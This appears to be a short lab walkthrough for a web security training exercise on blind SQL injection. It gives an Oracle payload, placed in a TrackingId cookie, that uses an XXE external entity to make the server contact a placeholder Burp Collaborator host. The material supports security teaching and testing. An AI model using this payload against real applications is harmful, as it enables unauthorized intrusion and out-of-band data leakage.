--The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
--The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain. 

--Exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

    Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.

    Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
    TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
